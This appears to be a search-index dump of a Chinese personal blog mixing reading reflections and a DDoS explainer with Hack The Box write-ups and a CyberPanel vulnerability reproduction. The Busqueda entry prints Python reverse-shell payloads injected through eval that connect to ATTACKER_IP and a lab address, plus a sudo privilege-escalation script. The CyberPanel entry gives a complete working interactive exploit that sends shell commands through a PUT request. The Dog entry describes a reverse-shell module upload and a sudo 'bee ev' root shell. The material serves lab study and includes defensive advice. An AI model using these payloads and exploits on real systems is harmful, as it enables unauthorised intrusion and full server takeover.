run。","tags":["网络"],"categories":["计算机网络"]},{"title":"comments","path":"/comments/index.html","content":"留下您的足迹，我会仔细阅读每一条留言。谢谢您的关注和支持！","categories":[null]},{"title":"书籍是人类进步的阶梯","path":"/wiki/Reading Plan/index.html","content":"读书，是与智者对话，是与世界连接，是与自我和解。 这里记录的，是我在不同时期、不同心境下，与书籍相遇的故事。它们或深刻、或轻松，或引人深思、或令人莞尔。 这些书，这些想法，塑造了今天的我。分享出来，希望也能给你带来一些启发。","tags":[null],"categories":[null]},{"title":"凯尔特的薄暮","path":"/wiki/Reading Plan/凯尔特的薄暮.html","content":"幻想 如果不是我怜惜所有耽于幻想的孩子们，我会让他们争吵下去的，那么我现在就会有许多精彩的口角记录下来了。 书中的许多故事简短而富有童话般的色彩，仿佛让我回到了阅读安徒生童话的童年时光，读到中途，感觉稍显幼稚？想放弃但又坚持了下来。 我放弃的原因，一方面是随着年龄增长（次要原因），另一方面，也是更主要的原因，是生活和工作的操劳让我对事物的感受力逐渐消失。加之这次过年放假回家，我走在家乡的大道上，发现曾经熟悉的景象已面目全非。就像我家旁边那棵参天大槐树，记忆中它枝繁叶茂，每到秋天我都会去摘槐花，如今却已不见踪影。若非旧照片为证，我几乎要怀疑记忆中的景象是否真实存在过。还有每次晚上睡觉时，路灯透过窗户投射进屋内的光影，曾让那时的我看到千变万化的景象——有时是长发飘飘的女子，有时是流动的云彩。可如今再看，那些光影不过是再普通不过的光源罢了，不禁扼腕叹息。 虚妄 是相信大多虚妄之事和一点事实，还是纯粹为否认而否认所有的事实和想象。也许宁信其有不信其无是一种更明智的寻求真理的态度。 书中对自然的敬畏之情，这让我不禁想起上一本阅读的书籍——孔飞力的《叫魂》。江南水乡，妖术流言四起，人们因姓名、衣物乃至发辫的斩断而陷入无尽恐慌。这飘荡在水雾间的惊惧，竟与凯尔特农妇在壁炉余烬中窥视命运的身影奇妙地重叠，以及担心被仙人抓走的恐惧。何其相似的民间叙事！ 现在我们回看从前的事物，或许会觉得怎会如此愚昧、无知。但若脱离当时的时代背景，以今人的视角来看，我们又何尝没有自身的局限？探索真理，本就是摸着石头过河。 景色 我记得我们在那里站了几分钟，眺望着满是石头、荆棘和灌木的田野，突然我看到地平线上有一小团亮光，似乎在慢慢升向天空；然后有一两分钟，我们又看到其它一些微弱的光点，最后有一道明亮的火焰——犹如火炬一般——在河上快速地移动着。我们当时看着这一切，如梦如幻，似乎进入了一个不真实的世界。 不由得想起在都柏林徒步爬山时的情景，与Elon、Lydia、Catherine和来自台湾的朋友劉晉豪一起登顶的喜悦。与其说是登顶的成就感，倒不如说是途中所见的风景更令人难忘。通往山顶的路程始于一段陡坡，宽度堪比盘山公路，需要特别留意往来车辆，尤其是视觉盲区。还未到达山底，体力就已消耗不少。 抵达山底后开始真正的攀登，来到一处铺满鹅暖石的地方，还有青玉石般的台阶。瞬间觉得没白来。从下往上望去，台阶仿佛直通天际。沿途遇见三三两两的本地徒步者和情侣，中途还看到了印度人。印度人总是成群结队，这是我的印象，而白人更多是两三结群，或者独自行动。 随着海拔升高，气温渐低，天公作美地下起了雨，更添几分意趣。湿润的空气中，仿佛穿越回原始丛林，城市的喧嚣早已远去，内心告诉我这才是我向往的地方。想起杭州那个电梯爬山景区，虽然在无障碍设施方面做得很好，方便了老人和残疾人，但少了几分登山的乐趣。中国人太多，每次去逛些什么地方，像是西湖去了第一次，就不想再去第二次。不过偶尔晚上去西湖的时候，人不算多，见到波光粼粼的湖水，瞬间仿若仙境，更能嗅到泥土的芬芳。 回想起在飞机上俯瞰都柏林时，大片不规则的绿色山丘，让我想起小学时看过的纪录片，从生命诞生之初，到人类文明的蓬勃发展。 思绪拉回爬山时的情景，我下山的时候，和Catherine、Elon有了分歧，我和Lydia想走小道下山，因为我俩发现小道更加隐蔽、原始，大道已经走过来更加熟悉也不想走了。但是Catherine他们想走大道。最后还是走了小道，具体缘由不记得了。下山时，我们遇到左边丛林有一个阴森森的地方，瞬间我和Lydia来了兴趣，于是踏入这像墓地一般的地方，我倾向于相信自然界充满了我们看不见的事物，犹记得踩在脚下软绵绵的，身边似有阴魂般的丛林，我和Lydia、Elon往前走去，最后看到了微弱的光点，通往前面的就是光明大道。 继续往下，重见来时路后，我和Catherine健步如飞地奔跑下坡，借着惯性，仿佛将人类性能发挥到极致，那感觉真是酣畅淋漓。傍晚五点，我们在路边等候巴士，准备搭乘luas回家。不过先去巧面馆吃了晚餐，这已是我第二次去了。店里的酱牛肉很好吃，但面条的口感，一言难尽，缺少劲道。 这已经是去年的事情了，我的记录不过当时经历的1/3，但我暂时只能想起这些了，等之后想起来再更新上，或者再也不更新了，谁知道呢。","tags":[null],"categories":[null]},{"title":"寻书 - 金瓶梅","path":"/wiki/Reading Plan/寻书 - 金瓶梅.html","content":"词话本（万历本） 最常见的市场流通版本 特点：诗词丰富，风格通俗市井 缺点：谋篇布局较草率，情节矛盾较多 第一回：《景阳冈武松打虎，潘金莲嫌夫卖风月》 绣像本（崇祯本） 齐鲁书社版本 特点：含插画，经过精心修订，写作水准更高 第一回：《西门庆热结十弟兄，武二郎冷遇亲哥嫂》 张竹坡评本（和第一奇书本） 含张竹坡批注评论 版本差异 回目不同：开篇故事起点差异明显 情节不同：崇祯本从西门庆结拜兄弟开始，词话本直接从武松打虎开始 文字风格：词话本保留大量诗词曲赋和韵文，是两版本最大区别 推荐版本 《金瓶梅词话》（香港太平书局1982年版） 繁体字版本 可在Z-Library下载 《梦梅馆校本金瓶梅词话》（2007年里仁书局版） 校订者：梅节 特点：全本无删减的词话本，校订质量高 可在Z-Library下载","tags":[null],"categories":[null]},{"title":"DDoS 攻击","path":"/wiki/Emergency Response/DDoS 攻击.html","content":"什么是DDoS攻击呢？ 其实，DDoS攻击，全称是“分布式拒绝服务攻击”（Distributed Denial of Service）， 听起来有点长，但你可以简单地把它想象成一群“坏人”同时涌向一家小小的店铺。这家店铺原本可以轻松接待每天的正常顾客，但是突然来了成千上万的“坏人”，把店铺门口堵得水泄不通，真正想进去买东西的顾客（也就是我们这些正常用户）就被挤在外面，根本进不去，店铺也因此无法正常营业了。 在互联网世界里，“店铺”就是网站、服务器或者网络服务。 “坏人”就是来自各处的恶意网络流量。 这些流量像潮水一样涌向目标，消耗目标的网络带宽和服务器资源，最终导致目标服务器不堪重负，无法响应正常的请求，我们就没办法正常访问网站、使用APP，或者进行在线游戏等等。 DDoS攻击有很多种类型，但目的都是一样的：让你的服务变得不可用。 简单来说，DDoS攻击就是通过大量的无效请求，拥堵网络通道或服务器，使得正常用户无法访问目标服务。 如何判断DDoS攻击呢？ 需要观察网站的访问速度、网络流量、服务器资源、日志信息，以及安全设备的警报等 网站或服务突然变得非常慢，甚至完全无法访问： 就像你平时浏览网页很流畅，突然之间网页打开特别慢，或者直接显示“无法访问此网站”。 网络流量异常飙升： 流量激增往往超出正常的用户访问量，可能是攻击者在发送大量的无效请求。 服务器资源消耗异常增高： DDoS攻击会消耗服务器的CPU、内存、带宽等资源。如果发现服务器资源占用率突然变得非常高，甚至达到100%，而正常的业务请求并没有显著增加，这也可能是DDoS攻击造成的。 出现大量的错误请求或连接请求： 在服务器的日志中，可能会出现大量的错误请求（例如404错误、500错误）或者连接请求失败的记录。 这些记录可能表明有大量的恶意流量在尝试访问服务，但服务器已经无法正常处理。 安全设备发出警报： 如果你使用了防火墙、入侵检测系统（IDS）、DDoS防护设备等安全设备，这些设备可能会检测到异常流量或攻击行为并发出警报。","tags":[null],"categories":[null]},{"title":"应急响应","path":"/wiki/Emergency Response/index.html","content":"应急响应流程脑图","tags":[null],"categories":[null]},{"title":"Busqueda — Hack The Box Machine","path":"/wiki/XSS-and-Security-Labs/Busqueda.html","content":"连接 https://app.hackthebox.com/machines/Busqueda 参考： 靶场笔记-HTB Busqueda - FreeBuf网络安全行业门户 htb busqueda wp要点记录_春猿火的博客-CSDN博客 https://www.youtube.com/watch?v=I2n4SDUXEYI https://ratil.life/hack-the-box-busqueda/ https://blog.213.se/busqueda-hackthebox/ 123sudo openvpn lab_Wreath0690.ovpn10.10.11.208 侦查 1234# 初始端口扫描nmap -A 10.10.11.208# 系统——Ubuntu Searcher 2.4.0 容易受到命令注入的攻击 反弹 shell Google 搜索： “Searchor” poc vulnerabilty exploit “Searchor” exploit POC https://github.com/jonnyzar/POC-Searchor-2.4.2 12345678# 易受攻击的代码包括 eval() 方法：url = eval( f&quot;Engine.&#123;engine&#125;.search(&#x27;&#123;query&#125;&#x27;, copy_url=&#123;copy&#125;, open_web=&#123;open&#125;)&quot; ) &#x27;, exec(&quot;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;ATTACKER_IP&#x27;,PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/sh&#x27;,&#x27;-i&#x27;]);&quot;))# 1engine=Ask&amp;query=&#x27;, exec(&quot;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;10.10.16.8&#x27;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/sh&#x27;,&#x27;-i&#x27;]);&quot;))# 12# 另一个命令行窗口nc -lvvp 4444 进入后，有一个用户帐户“svc”，我可以得到“user.txt”。 123456789101112131415161718192021222324252627282930313233343536373839404142$ cd /var/www/app$ pwd/var/www/app$ lsapp.pytemplates$ ls -latotal 20drwxr-xr-x 4 www-data www-data 4096 Apr 3 14:32 .drwxr-xr-x 4 root root 4096 Apr 4 16:02 ..-rw-r--r-- 1 www-data www-data 1124 Dec 1 14:22 app.pydrwxr-xr-x 8 www-data www-data 4096 May 15 21:06 .gitdrwxr-xr-x 2 www-data www-data 4096 Dec 1 14:35 templates$ cd .git$ ls -latotal 52drwxr-xr-x 8 www-data www-data 4096 May 15 21:06 .drwxr-xr-x 4 www-data www-data 4096 Apr 3 14:32 ..drwxr-xr-x 2 www-data www-data 4096 Dec 1 14:35 branches-rw-r--r-- 1 www-data www-data 15 Dec 1 14:35 COMMIT_EDITMSG-rw-r--r-- 1 www-data www-data 294 Dec 1 14:35 config-rw-r--r-- 1 www-data www-data 73 Dec 1 14:35 description-rw-r--r-- 1 www-data www-data 21 Dec 1 14:35 HEADdrwxr-xr-x 2 www-data www-data 4096 Dec 1 14:35 hooks-rw-r--r-- 1 root root 259 Apr 3 15:09 indexdrwxr-xr-x 2 www-data www-data 4096 Dec 1 14:35 infodrwxr-xr-x 3 www-data www-data 4096 Dec 1 14:35 logsdrwxr-xr-x 9 www-data www-data 4096 Dec 1 14:35 objectsdrwxr-xr-x 5 www-data www-data 4096 Dec 1 14:35 refs$ cat config[core] repositoryformatversion = 0 filemode = true bare = false logallrefupdates = true[remote &quot;origin&quot;] url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git fetch = +refs/heads/*:refs/remotes/origin/*[branch &quot;main&quot;] remote = origin merge = refs/heads/main$ **config **文件中拿到用户名密码 username password svc jh1usoih2bkjaspwe92 使用 ssh svc@10.10.11.208 连接用户 svc 提权 123456svc$ sudo -S -l&gt; [sudo] password for svc: jh1usoih2bkjaspwe92&gt; ... snip ...&gt;&gt; User svc may run the following commands on busqueda:&gt; (root) /usr/bin/python3 /opt/scripts/system-checkup.py * 12345678910111213141516svc$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py /etc/passwd&gt; Usage: /opt/scripts/system-checkup.py &lt;action&gt; (arg1) (arg2)&gt;&gt; docker-ps : List running docker containers&gt; docker-inspect : Inpect a certain docker container&gt; full-checkup : Run a full system checkup# 用户 svc 在 busqueda 上具有特权执行脚本 system-checkup.py 的能力# 用户 svc 试图使用 sudo 执行 /usr/bin/python3 /opt/scripts/system-checkup.py /etc/passwd 命令，其中 /etc/passwd 被作为参数传递给 system-checkup.py 脚本# 脚本的用法提示system-checkup.py 脚本支持以下动作选项：docker-ps：列出正在运行的 Docker 容器。docker-inspect：检查特定的 Docker 容器。full-checkup：运行完整的系统检查。 现在需要知道 full-chesckup 子命令的运行方式 创建一个脚本full-checkup.sh，将反向 shell 填充到里面以进行 root 权限升级 touch full-checkup.sh vim full-checkup.sh 1234567891011#!/usr/bin/python3import socketimport subprocessimport oss=socket.socket(socket.AF_INET,socket.SOCK_STREAM)s.connect((&quot;10.10.16.8&quot;,4441))os.dup2(s.fileno(),0)os.dup2(s.fileno(),1)os.dup2(s.fileno(),2)import ptypty.spawn(&quot;sh&quot;) chmod +x full-checkup.sh sudo -S /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup 12345nc -nlvp 4441ls /rootcat /root/root.txt","tags":[null],"categories":[null]},{"title":"Hackthebox 赛季靶场 Code Writeup：Python 代码编辑器漏洞利用到 Root 提权","path":"/wiki/XSS-and-Security-Labs/Code.html","content":"介绍 靶机链接: https://app.hackthebox.com/machines/Code 靶机 IP: 10.10.11.62 本次 Hackthebox 靶机 “Code” 的目标是利用一个运行在 5000 端口的 Python 代码编辑器，通过代码执行漏洞获取用户凭据，然后利用 backy.sh 备份脚本的漏洞进行提权，最终获取 root 权限。 思路： 信息收集：使用Nmap发现开放的5000端口运行Python代码执行服务 漏洞发现：利用SQLAlchemy ORM进行数据库查询获取用户凭据 获取立足点：使用破解的用户凭据进行SSH登录 权限提升：利用备份脚本backy.sh的路径解析漏洞访问受限目录 一、信息收集 首先使用 Nmap 进行端口扫描 Nmap 扫描结果： 发现开放的22(SSH)和5000(HTTP)端口。5000端口运行着&quot;Python Code Execution Page&quot;。 确定Web框架 尝试Django ORM语法：User.objects.all()（失败） 尝试SQLAlchemy语法：User.query.all()（成功） 确认目标使用SQLAlchemy作为ORM框架 12users = db.session.query(User).all()print([(u.id, u.username, u.password) for u in users]) 代码执行结果： 成功查询到用户 development 和 martin 的信息，包括用户名和密码哈希值 使用CrackStation在线破解获得明文密码 密码破解结果： 成功破解出两个用户的明文密码： 用户 ID 用户名 密码哈希 (Password Hash) 哈希类型 (Hash Type) 已破解密码 (Cracked Password) 1 development 759b74ce43947f5f4c91aeddc3e5bad3 md5 development 2 martin 3de6f30c4a09c27fc71932bfc68474be md5 nafeelswordsmaster 尝试使用破解的密码进行 SSH 登录。 12ssh development@10.10.11.62 # 失败ssh martin@10.10.11.62 # 成功（密码：nafeelswordsmaster） 二、userFlag 登录 martin 用户后，首先查看用户目录下的文件，发现 backups 目录。 进入 backups 目录，查看目录内容，没有发现 user.txt 文件。 输入 sudo -l 命令查看当前用户可以以 sudo 权限执行的命令。 发现 martin 用户可以使用 sudo 权限执行 /usr/bin/backy.sh 脚本，这可能是一个提权点。 查看 /usr/bin/backy.sh 脚本的内容： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950cat /usr/bin/backy.sh#!/bin/bashif [[ $# -ne 1 ]]; then /usr/bin/echo &quot;Usage: $0 &lt;task.json&gt;&quot; exit 1fijson_file=&quot;$1&quot;if [[ ! -f &quot;$json_file&quot; ]]; then /usr/bin/echo &quot;Error: File &#x27;$json_file&#x27; not found.&quot; exit 1fi# 定义了允许备份的路径前缀，只允许备份以 /var/ 或 /home/ 开头的目录allowed_paths=(&quot;/var/&quot; &quot;/home/&quot;)# 使用 jq 工具处理JSON文件，删除 directories_to_archive 数组中所有路径中的 ../ 序列# 这里在尝试防止目录遍历，但它只替换了确切的 ../ 字符串# gsub(&quot;\\\\.\\\\./&quot;; &quot;&quot;): 这是 gsub 函数，用于全局替换字符串。# &quot;\\\\.\\\\./&quot;: 要被替换的 正则表达式。 \\\\. 表示转义后的点号 (.)， \\. 表示字面意义的点号。 .. 就是字面意义的 &quot;..&quot;。 所以 # \\\\.\\\\./ 匹配的是字符串 ../。# &quot;&quot;: 替换成空字符串。updated_json=$(/usr/bin/jq &#x27;.directories_to_archive |= map(gsub(&quot;\\\\.\\\\./&quot;; &quot;&quot;))&#x27; &quot;$json_file&quot;)/usr/bin/echo &quot;$updated_json&quot; &gt; &quot;$json_file&quot;directories_to_archive=$(/usr/bin/echo &quot;$updated_json&quot; | /usr/bin/jq -r &#x27;.directories_to_archive[]&#x27;)is_allowed_path() &#123; local path=&quot;$1&quot; for allowed_path in &quot;$&#123;allowed_paths[@]&#125;&quot;; do if [[ &quot;$path&quot; == $allowed_path* ]]; then return 0 fi done return 1&#125;for dir in $directories_to_archive; do if ! is_allowed_path &quot;$dir&quot;; then /usr/bin/echo &quot;Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed.&quot; exit 1 fidone/usr/bin/backy &quot;$json_file&quot;martin@code:~$ 分析 backy.sh 脚本，发现其主要功能如下： 参数检查: 必须传入 JSON 配置文件路径（例如 task.json）。 路径过滤: 使用 jq 移除 directories_to_archive 中的 ../，防止目录遍历攻击，可以使用 ....// 这样的序列，当 ../ 被移除后，会变成 ../ 路径限制: 只允许备份 /var/ 和 /home/ 开头的目录。 备份操作: 使用 tar 命令将指定目录打包备份到指定目标路径。 进入 backups 目录，查看已存在的 task.json 文件内容。 查看 task.json 文件内容: task.json 文件的内容配置了备份 /home/app-production/app 目录到 /home/martin/backups/ 目录。 尝试执行 sudo /usr/bin/backy.sh task.json 命令，测试备份脚本是否正常工作。 脚本成功执行，并在 /home/martin/backups/ 目录下生成了一个压缩包 code_home_app-production_app_xxxx_xxxx.tar.bz2。 解压该压缩包，验证备份内容。 解压备份文件： 解压后发现，备份脚本确实将 /home/app-production/app 目录下的所有内容都备份到了压缩包中。 这意味着我们可以通过修改 task.json 文件，让备份脚本备份其他目录，从而提取敏感信息。 修改 task.json 文件，将 directories_to_archive 修改为 &quot;/home/app-production/&quot;，目标是备份 /home/app-production/ 目录，以获取 userFlag。 修改后的 task.json 文件内容 (获取 userFlag): 再次执行 sudo /usr/bin/backy.sh task.json 命令。 执行 sudo /usr/bin/backy.sh task.json (获取 userFlag): 脚本成功执行，并在 /home/martin/backups/ 目录下生成了新的压缩包。 解压该压缩包，找到 user.txt 文件，即可获取 userFlag。 三、rootFlag 既然 userFlag 可以通过修改 task.json 文件获取，那么 rootFlag 也同理，我们可以尝试修改 task.json 文件来备份 root 目录。 尝试将 task.json 文件修改为备份 /root 目录。 由于 backy.sh 脚本会过滤掉 ../，为了绕过路径检查，我们使用路径 /home/....//root/。 这个路径在 Linux 文件系统中会被解析为 /root 目录。 12345678&#123; &quot;destination&quot;: &quot;/home/martin/backups/&quot;, &quot;multiprocessing&quot;: true, &quot;verbose_log&quot;: true, &quot;directories_to_archive&quot;: [ &quot;/home/....//root/&quot; ]&#125; 修改后的 task.json 文件内容，cat 进行查看发现 …/ 已经被过滤(获取 rootFlag): 可以看到，directories_to_archive 已经修改为 &quot;/home/../root/&quot;。 可以看到，backy.sh 脚本执行成功，并且 tar 命令开始打包 /home/../root/ 目录下的文件。从输出信息 Archiving: [/home/root] 和 tar: Removing leading '/home/../' 可以看出，backy.sh 和 tar 都正确地处理了这个路径，最终备份的目标是 /root 目录。 发现 root 目录！ 安全建议 代码编辑器安全: 避免对外暴露不必要的服务，例如代码编辑器。如果必须使用，请确保代码编辑器本身的安全，并进行严格的权限控制和输入验证，防止代码执行漏洞。 脚本安全: 对于具有高权限 (sudo) 的脚本，必须进行严格的安全审计，防止被恶意利用。 特别是要仔细检查脚本对用户输入 (例如配置文件) 的处理，防止路径遍历、命令注入等漏洞。 最小权限原则: 运行脚本和服务的用户，应遵循最小权限原则，避免赋予不必要的权限。 安全配置: 对于备份脚本，应仔细配置备份策略，例如限制备份目录范围，避免备份敏感数据。","tags":[null],"categories":[null]},{"title":"【漏洞复现 - 241029】CyberPanel 存在远程代码执行（RCE）漏洞","path":"/wiki/XSS-and-Security-Labs/CyberPanel has a remote code execution (RCE) vulnerability.html","content":"过程 偶然发现What Are My OPTIONS? CyberPanel v2.3.6 pre-auth RCE 于是乎抱着学习的心态，进行测试，根据cyberpanel文档说明，搭建本地环境进行漏洞复现 CyberPanel 是一个使用 Django 框架的 Web 应用程序，主要用于管理 VPS 上的各种服务。 首先进入主页时，只有登录功能，通过查阅文档，发现以下信息 Django 中处理 HTTP 请求 body 的方式 在 Django 中，每个请求对象（request）都有一个 body 属性，存储了请求的原始内容。根据 Django 的文档说明，body 属性会捕获传入的原始请求数据，而这个数据并不区分请求方法。无论是 POST 还是 PUT 请求，只要发送了 body，Django 都能处理。 通过测试，发现中间件仅对 POST 请求进行字符过滤和安全检查 → 其他 HTTP 方法（PUT、PATCH、OPTIONS）没有被过滤 → 利用这一逻辑缺陷，绕过中间件安全检查。 EXP 1234567891011121314151617181920212223242526272829303132import httpx import sys def get_CSRF_token(client): resp = client.get(&quot;/&quot;) return resp.cookies[&#x27;csrftoken&#x27;] def pwn(client, CSRF_token, cmd): headers = &#123; &quot;X-CSRFToken&quot;: CSRF_token, &quot;Content-Type&quot;:&quot;application/json&quot;, &quot;Referer&quot;: str(client.base_url) &#125; payload = &#x27;&#123;&quot;statusfile&quot;:&quot;/dev/null; %s; #&quot;,&quot;csrftoken&quot;:&quot;%s&quot;&#125;&#x27; % (cmd, CSRF_token) return client.put(&quot;/dataBases/upgrademysqlstatus&quot;, headers=headers, data=payload).json()[&quot;requestStatus&quot;] def exploit(client, cmd): CSRF_token = get_CSRF_token(client) stdout = pwn(client, CSRF_token, cmd) print(stdout) if __name__ == &quot;__main__&quot;: target = sys.argv[1] client = httpx.Client(base_url=target, verify=False) while True: cmd = input(&quot;$&gt; &quot;) exploit(client, cmd)","tags":[null],"categories":[null]},{"title":"Hackthebox 赛季靶场 Dog Writeup","path":"/wiki/XSS-and-Security-Labs/Dog — Hack The Box.html","content":"靶机链接: https://app.hackthebox.com/machines/Dog 靶机 IP: 10.10.11.58 本次渗透测试的目标是获取 Hack The Box 上的 “Dog” 靶机的 user 和 root 权限。我们将从信息收集开始，逐步深入，最终获得最高权限。 一、信息收集 1. Nmap 端口扫描 先通过 PING 连接性测试之后，首先，照旧 Nmap 对目标 IP 10.10.11.58 进行端口扫描，以了解开放的服务。 图 1: Nmap 扫描显示开放了 22 (SSH - OpenSSH 8.2p1) 和 80 (HTTP - Apache 2.4.41) 端口，Web 服务器运行着 Backdrop CMS 1.x。 分析: 目标 IP: 10.10.11.58 操作系统: Ubuntu Linux 开放端口: 22 (SSH), 80 (HTTP) Web 应用: Backdrop CMS 1.x 关键信息点: Web 服务 (端口 80) 是主要入口。 Backdrop CMS 1.x 可能存在已知漏洞。 Nmap 脚本扫描还提示了 /.git/ 目录的存在，这是一个重要的潜在信息泄露点。 2. Web 服务 访问 http://10.10.11.58/，可以看到一个关于狗狗护理和健康的网站。 图 2: Dog 靶机 Web 服务首页。 查看 robots.txt 文件 (http://10.10.11.58/robots.txt)，发现其中列出了许多不允许爬虫访问的路径，这有助于我们了解网站结构。 图 3: Nmap 探测到的 robots.txt 路径。 图 4: robots.txt 文件内容，包含 /core, /admin, /modules 等路径。 3. 目录扫描与 .git 发现 使用 dirsearch 等工具进行目录扫描，确认了 .git 目录的存在。 1dirsearch -u http://10.10.11.58 图 5: Dirsearch 确认了 http://10.10.11.58/.git/ 目录的存在。 公开的 .git 目录意味着网站的源代码和版本历史可能被泄露，这是获取敏感信息（如配置文件、凭据）的关键突破口。 二、初步立足 (Initial Foothold) 1. 利用 .git 泄露获取源码 使用 git-dumper (或类似工具如 GitHack) 来下载 .git 仓库的内容。 1git-dumper.py http://10.10.11.58/.git/ .dog_repo 图 6: 使用 git-dumper 下载 .git 仓库。 图 7: git-dumper 成功下载并提示检出文件。 2. 分析源码，发现凭据 在下载的源码中搜索敏感信息。settings.php 通常是 CMS 的核心配置文件。 图 8: 在下载的源码中发现 settings.php 文件。 查看 settings.php 内容： 1cat settings.php 图 9: 在 settings.php 中找到 MySQL 数据库的密码 BackDropJ2024DS2024。 3. 登录 Backdrop CMS 后台 尝试使用找到的凭据 tiffany:BackDropJ2024DS2024 登录 Backdrop CMS 的后台 图 10: 确认用户名 tiffany。 图 11: 使用凭据成功登录 Backdrop CMS 后台。 4. 确定 CMS 版本并寻找漏洞 在下载的源码中搜索版本信息，确定 Backdrop CMS 的具体版本。 1grep -rin &quot;version&quot; . | grep &quot;&#x27;1.&quot; 图 12: 通过搜索源码中的 ‘version’ 关键字，确定版本为 1.27.1。 搜索 “Backdrop 1.27.1 exploit”，找到了 Exploit-DB 上的一个已认证远程命令执行 (RCE) 漏洞：https://www.exploit-db.com/exploits/52021。 该漏洞利用管理员权限，通过上传包含恶意 PHP 代码的模块来实现 RCE。 5. 准备并上传恶意模块 (反弹 Shell) 生成基础模块结构: 运行 Exploit-DB 提供的 Python 脚本 (52021.py) 来生成一个基础的模块压缩包和目录结构。 图 13: 生成 shell 目录和 shell.zip。 替换为反弹 Shell: 将 shell/shell.php 的内容替换为 PHP 反弹 Shell 代码 (例如来自 pentestmonkey 的脚本，php-reverse-shell.php)。修改脚本中的 $ip 为你的攻击机 IP，$port 为你打算监听的端口 (例如 1234)。 打包为 .tar.gz: 查看后台模块上传页面 (/?q=admin/installer/manual)，发现它只接受 .tar, .tgz, .gz, .bz2 格式。因此，需要将修改后的 shell 目录打包成 .tar.gz 格式。 图 14: 手动安装模块的界面。 图 15: 上传界面提示支持的压缩格式。 12# 将修改好的 shell.php 放入 shell 目录tar czvf shell.tar.gz shell/ 图 16: 使用 tar 命令创建 shell.tar.gz。 设置监听: 在攻击机上使用 nc 监听指定端口。 1nc -nlvp 1234 (注意：确保你的防火墙允许该端口的入站连接。) 上传并触发: 在 Backdrop CMS 后台上传 shell.tar.gz 文件。 图 17: 在后台上传准备好的恶意模块压缩包。 上传成功后，访问模块中的 PHP 文件以触发反弹 Shell： 1curl http://10.10.11.58/modules/shell/shell.php (如果直接访问无反应，可能是因为 PHP 脚本尝试后台运行，或者防火墙阻止了出站连接。使用 curl 或浏览器访问通常能成功触发。) 6. 获取反弹 Shell 成功触发后，nc 监听器应收到来自目标服务器的连接，获得一个 www-data 用户的 Shell。 图 18: nc 监听器成功接收到来自靶机的反弹 Shell，用户为 www-data。 为了更好的交互体验，可以使用 Python 升级 Shell： 12which python3python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27; 三、用户权限提升 (User Privilege Escalation) 在 www-data Shell 中，查看 /home 目录，发现存在用户 johncusack。 尝试读取 /home/johncusack/user.txt，发现权限不足。 回忆之前在 settings.php 中找到的数据库密码 BackDropJ2024DS2024，尝试用它切换到 johncusack 用户。 12su johncusack# 输入密码: BackDropJ2024DS2024 图 19: 成功使用之前找到的密码切换到 johncusack 用户。 切换成功后，即可读取 user.txt 文件。 1cat /home/johncusack/user.txt 四、Root 权限提升 (Root Privilege Escalation) 1. Sudo 权限检查 在 johncusack 用户下，检查其 sudo 权限。 12sudo -l# 再次输入密码: BackDropJ2024DS2024 图 20: sudo -l 显示 johncusack 可以以任意用户 (ALL:ALL) 身份，无需密码执行 /usr/local/bin/bee 命令。 结果显示 johncusack 用户可以无需密码以 root 权限执行 /usr/local/bin/bee 命令。 2. 分析 bee 命令 bee 是 Backdrop CMS 的命令行工具。查看其帮助信息或相关文档，寻找可利用的功能。 1/usr/local/bin/bee --help 图 21: bee 命令帮助信息显示存在 eval (ev) 子命令，可以执行任意 PHP 代码。 关键在于 eval (或 ev) 子命令，它允许执行任意 PHP 代码。 3. 利用 bee eval 获取 Root Shell 由于我们可以通过 sudo 以 root 权限运行 bee，并且 bee 可以执行 PHP 代码，我们可以结合这两点来获取 root Shell。 首先，bee 命令通常需要在 Backdrop CMS 的网站根目录下执行才能正常工作。 12cd /var/www/htmlsudo /usr/local/bin/bee ev &#x27;system(&quot;/bin/bash&quot;);&#x27; 这个命令做了以下事情： sudo /usr/local/bin/bee: 以 root 权限启动 bee 工具。 ev: 使用 bee 的 eval 功能。 'system(&quot;/bin/bash&quot;);': 要执行的 PHP 代码。system() 函数用于执行系统命令，这里我们让它启动一个 Bash Shell。 图 22: 执行 sudo bee ev ‘system(“/bin/bash”);’ 后，成功获得 root 权限的 Shell。 4. 读取 Root Flag 现在可以读取位于 /root 目录下的 root.txt 文件。 五、总结 本次 Dog 靶机的渗透测试过程关键点如下： 信息收集: 通过 Nmap 扫描发现 Web 服务 (Backdrop CMS) 和 .git 目录暴露。 初步立足: 利用 git-dumper 下载 .git 仓库源码，在 settings.php 中找到数据库凭据 (tiffany:BackDropJ2024DS2024)。使用该凭据登录 Backdrop CMS 后台。 漏洞利用: 确定 CMS 版本为 1.27.1，找到对应的已认证 RCE 漏洞 (Exploit-DB 52021)。制作包含反弹 Shell 的恶意模块 (.tar.gz 格式)，通过后台上传并触发，获得 www-data Shell。 用户提权: 使用之前获取的密码 BackDropJ2024DS2024 通过 su 命令切换到 johncusack 用户，获得 user flag。 Root 提权: 检查 sudo -l 发现 johncusack 可以免密以 root 权限运行 bee 命令。利用 bee 的 eval 功能执行 PHP system('/bin/bash')，最终获得 root Shell 并读取 root flag。 六、防御 定期审计与加固： 必须定期审计 Web 服务器配置，确保禁止目录列表，并严格限制对敏感目录（如 .git, .svn 等版本控制目录，以及配置文件目录）的访问。 严格审查 sudoers 配置，遵循最小权限原则，避免使用 ALL 和 NOPASSWD，精确授权必要的命令。 补丁与更新管理： 及时更新 CMS 核心、主题和插件至最新安全版本，是防御已知漏洞利用的基础。订阅相关的安全公告。 Secrets Management： 绝不将密码、API 密钥等敏感信息硬编码在代码或配置文件中，并提交到版本控制系统。应使用环境变量、安全的 Secrets Management 工具或安全的配置文件注入方式。 强制安全策略： 实施强密码策略，并禁止密码重用。考虑为关键系统（如 SSH、管理后台）启用多因素认证 (MFA)。","tags":[null],"categories":[null]},{"title":"DVWA 靶场","path":"/wiki/XSS-and-Security-Labs/DVWA-master.html","content":"参考： 